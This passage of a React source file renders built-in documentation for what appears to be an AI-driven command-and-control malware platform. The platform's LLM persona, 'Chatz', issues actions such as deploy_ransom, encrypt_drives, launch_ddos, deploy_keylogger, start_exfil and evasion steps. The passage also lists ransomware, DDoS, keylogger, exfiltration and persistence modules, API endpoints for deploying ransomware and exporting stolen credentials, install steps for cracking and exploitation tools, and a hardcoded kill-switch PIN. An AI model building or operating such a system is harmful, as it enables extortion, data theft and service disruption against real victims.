      <CodeBlock>{'{\n  "actions": [{\n    "type": "action_name",\n    "nodes": ["all" or specific node IDs],\n    "params": { "key": "value" }\n  }]\n}'}</CodeBlock>

      <SubHeader>All Valid Action Types (40+)</SubHeader>
      <div style={{ display: "flex", flexWrap: "wrap", gap: 4, marginBottom: 12 }}>
        {["rotate_ips","change_beacon_interval","enable_doh","activate_evasion","harvest_target","change_encryption","deploy_payload","kill_switch","silent_mode","full_scan","execute","deploy_ransom","encrypt_drives","lockscreen","ransom_exfil","launch_ddos","deploy_keylogger","screenshot","grab_clipboard","register_proxy","build_chain","route_traffic","start_exfil","stage_data","compress_data","run_nmap","run_hydra","run_sqlmap","run_hashcat","run_responder","run_metasploit","run_wpscan","run_ffuf","run_impacket","run_john","run_searchsploit","mutate","tor_build","tor_rotate","tor_torify"].map(a => (
            <code key={a} style={{ background: "rgba(0,212,255,0.06)", padding: "2px 6px", borderRadius: 3, fontSize: 9, color: "#00d4ff", fontFamily: "'JetBrains Mono', monospace" }}>{a}</code>
          ))}
      </div>

      <SubHeader>Example Prompts by Category</SubHeader>
      {Object.entries(CHATZ_PROMPTS).map(([cat, prompts]) => (
        <div key={cat}>
          <div style={{ color: "#00d4ff", fontSize: 11, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace", marginTop: 12, marginBottom: 4, textTransform: "uppercase" }}>{cat}</div>
          {prompts.map((p, i) => <PromptBlock key={i}>{p}</PromptBlock>)}
        </div>
      ))}

      <SubHeader>Chatz Memory</SubHeader>
      <Para>Chatz remembers ALL past conversations via Turso cloud memory. Every chat message is stored in the conversations table. Her system prompt includes the last 12 messages + 5 most recent AI decisions. This means she knows what you talked about yesterday, what mutations were applied, and which attacks were successful. Memory survives server restarts.</Para>
    </div>
  );
}

function Architecture() {
  return (
    <div>
      <SubHeader>Tech Stack</SubHeader>
      <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 12 }}>
        <Badge color="#00ff88">React 18 + TypeScript</Badge>
        <Badge color="#00d4ff">Vite 5 (bundler)</Badge>
        <Badge color="#ffd700">Framer Motion (animations)</Badge>
        <Badge color="#a855f7">Python 3.13 + FastAPI</Badge>
        <Badge color="#ff4757">Redis (real-time state)</Badge>
        <Badge color="#00d4ff">Turso/libsql (persistent memory)</Badge>
        <Badge color="#ff6ec7">Featherless AI (Qwen 9B)</Badge>
      </div>

      <SubHeader>File Structure</SubHeader>
      <CodeBlock>{`src/
├── gui/          Frontend (React + TypeScript)
│   ├── App.tsx         Main app + tab system
│   ├── components/     25+ components
│   ├── hooks/           WebSocket + auth hooks
│   └── styles/          CSS keyframes + animations
├── c2_server/    Backend (Python FastAPI)
│   ├── app.py          Main API + WebSocket
│   ├── server.py       Redis state management
│   ├── ransomware/     File encryption engine
│   ├── ddos/           Multi-vector DDoS engine
│   ├── keylogger/      Keystroke aggregation
│   ├── proxy/          SOCKS5 chain management
│   ├── exfil/          Data staging + transfer
│   ├── tor/            TOR circuit management
│   ├── rotating_proxy/ Free proxy scraper + pool
│   ├── tool_engine/    11 hacking tools subprocess
│   └── persistence/    Cross-platform persistence
├── ai_brain/      AI orchestration
│   ├── brain.py        Chatz command interface
│   ├── memory.py       Turso cloud memory
│   ├── llm.py          Multi-provider LLM client
│   └── payload_strategist.py  Payload generation
└── c2_client/     Beacon/node code
    └── beacon.py        WebSocket C2 client`}</CodeBlock>

      <SubHeader>API Endpoints (40+)</SubHeader>
      <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 10, fontFamily: "'JetBrains Mono', monospace" }}>
        <thead><tr style={{ borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
          <th style={{ padding: "6px", textAlign: "left", color: "#00d4ff" }}>Method</th>
          <th style={{ padding: "6px", textAlign: "left", color: "#00d4ff" }}>Path</th>
          <th style={{ padding: "6px", textAlign: "left", color: "#00d4ff" }}>Purpose</th>
        </tr></thead>
        <tbody>
          {[
            ["GET","/health","Server health check"],
            ["GET","/api/modules","Module status"],
            ["POST","/api/command","Execute C2 command"],
            ["POST","/api/ai/command","Chatz chat with command execution"],
            ["POST","/api/ai/mutate","Chamutate strategy"],
            ["GET","/api/events","Recent events"],
            ["GET","/api/ai/context","AI context (nodes, evasion, creds)"],
            ["GET","/api/ai/model","Active LLM model info"],
            ["GET","/api/ransomware/status","Ransomware engine status"],
            ["POST","/api/ransomware/deploy","Deploy ransomware"],
            ["GET","/api/ddos/status","DDoS engine status"],
            ["POST","/api/ddos/launch","Launch DDoS attack"],
            ["GET","/api/keylogger/status","Keylogger engine status"],
            ["GET","/api/tor/status","TOR routing status"],
            ["POST","/api/tor/build","Build TOR circuit"],
            ["GET","/api/tor/check-ip","IP mask verification"],
            ["GET","/api/proxy/status","Proxy chain status"],
            ["POST","/api/proxy/register","Register SOCKS5 proxy"],
            ["GET","/api/exfil/status","Exfiltration status"],
            ["GET","/api/rotating-proxy/status","Rotating proxy status"],
            ["GET","/api/memory/analytics","Turso memory analytics"],
            ["GET","/api/memory/search","Search conversations"],
            ["GET","/api/memory/profile","User profile"],
            ["POST","/api/memory/burn","🔥 Burn all memory (PIN protected)"],
            ["GET","/api/tools/status","Tool engine status"],
            ["POST","/api/tools/{name}/run","Execute hacking tool"],
            ["GET","/api/tools/history","Tool execution history"],
            ["GET","/api/tools/results/{id}","Specific tool output"],
            ["GET","/api/pdf/list","PDF list"],
            ["GET","/api/credentials/export","Export credentials (.txt/.csv)"],
          ].map(([m, p, d]) => (
            <tr key={p as string} style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}>
              <td style={{ padding: "4px 6px", color: m === "POST" ? "#ffd700" : "#00ff88", fontSize: 9 }}>{m}</td>
              <td style={{ padding: "4px 6px", color: "#00d4ff", fontSize: 9 }}>{p as string}</td>
              <td style={{ padding: "4px 6px", color: "#888", fontSize: 9 }}>{d as string}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function Troubleshooting() {
  return (
    <div>
      <SubHeader>AI Responses Cut Off</SubHeader>
      <Para><strong>Cause:</strong> max_tokens too low.{'\n'}<strong>Fix:</strong> Increased to 4096 in llm.py line 90. If still truncated, the model hit its response limit. Try shorter prompts or split into multiple requests.{'\n'}<strong>Check:</strong> grep max_tokens src/ai_brain/llm.py</Para>

      <SubHeader>"AI Offline" Error</SubHeader>
      <Para><strong>Cause:</strong> Featherless API key missing or provider returned 503.{'\n'}<strong>Fix:</strong> Check .env has FEATHERLESS_API_KEY set. If key is valid but still errors, Featherless may be down temporarily — the fallback chain auto-retries with exponential backoff.{'\n'}<strong>Fallback chain:</strong> Featherless → DeepSeek V3 → DeepSeek V4 Flash → offline message</Para>

      <SubHeader>Turso Not Configured</SubHeader>
      <Para><strong>Cause:</strong> .env missing TURSO_DATABASE_URL and TURSO_AUTH_TOKEN.{'\n'}<strong>Fix:</strong> Ensure load_dotenv() runs BEFORE imports in app.py (fixed — now at line 27).{'\n'}<strong>Verify:</strong> curl localhost:8000/api/memory/analytics</Para>

      <SubHeader>Login Not Working</SubHeader>
      <Para><strong>Creds:</strong> server-configured credentials.{'\n'}<strong>Persistence:</strong> auth stored in localStorage with 24-hour expiry.{'\n'}<strong>Reset:</strong> Open DevTools → Application → localStorage → delete virus_auth key.{'\n'}<strong>Burn PIN:</strong> configured on server</Para>

      <SubHeader>Scroll Jumping</SubHeader>
      <Para><strong>Fixed:</strong> AIChat uses containerRef.scrollTop instead of scrollIntoView (no longer scrolls the page). WS reconnect no longer fires setLoading(true) — prevents screen flash.{'\n'}<strong>Still jumping?</strong> Check hasLoadedOnce ref in App.tsx.</Para>

      <SubHeader>Tool Not Found</SubHeader>
      <Para><strong>Cause:</strong> Tool binary not in server PATH.{'\n'}<strong>Fix:</strong> Full paths configured in tool_engine/__init__.py. Check with: shutil.which(tool_command){'\n'}<strong>Install tools:</strong> apt install nmap hydra sqlmap hashcat responder exploitdb ffuf && pip install impacket && gem install wpscan</Para>

      <SubHeader>WebSocket Not Connecting</SubHeader>
      <Para><strong>URL:</strong> ws://localhost:8000/ws/dashboard{'\n'}<strong>Check:</strong> C2 server running (ps aux | grep uvicorn){'\n'}<strong>Retry:</strong> Exponential backoff in useWebSocket hook — 1s → 2s → 4s → ... → 30s cap</Para>

      <SubHeader>Simulation Not Working</SubHeader>
      <Para><strong>Toggle:</strong> Click "Start Simulation" in ControlPanel or tell Chatz "Toggle simulation"{'\n'}<strong>Verify:</strong> GET /api/simulation/status → "simulation_enabled": true{'\n'}<strong>Note:</strong> Simulation generates mock nodes, credentials, and events every 10 seconds</Para>

      <SubHeader>Memory Burned But Still Seeing Data</SubHeader>
      <Para><strong>Cause:</strong> Turso tables wiped but local Redis still has live state.{'\n'}<strong>Fix:</strong> The kill switch (💀 KILL button, 3-click + PIN 1381) handles everything — Redis flush, Turso wipe, event clear, simulation stop, and logout. No manual steps needed.</Para>
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  sideCard: {
    background: "rgba(12,14,28,0.85)", backdropFilter: "blur(20px)", borderRadius: 12,
    border: "1px solid rgba(0,212,255,0.1)", padding: "14px 8px",
    boxShadow: "0 4px 40px rgba(0,0,0,0.3)", position: "sticky", top: 6,
  },
  sideItem: {
    display: "flex", alignItems: "center", gap: 8, padding: "8px 10px",
    width: "100%", border: "none", borderRadius: 6, cursor: "pointer",
    fontFamily: "'JetBrains Mono', monospace", textAlign: "left", transition: "all 0.15s",
  },
  card: {
    background: "rgba(12,14,28,0.85)", backdropFilter: "blur(20px)", borderRadius: 12,
    border: "1px solid rgba(0,212,255,0.1)", boxShadow: "0 4px 40px rgba(0,0,0,0.3)",
  },
  sectionHeader: {
    display: "flex", alignItems: "center", gap: 10, padding: "14px 16px",
    cursor: "pointer", userSelect: "none",
  },
  sectionTitle: {
    margin: 0, color: "#00d4ff", fontSize: 15, fontWeight: 600,
    fontFamily: "'JetBrains Mono', monospace",
  },
};

export default DocsPanel;
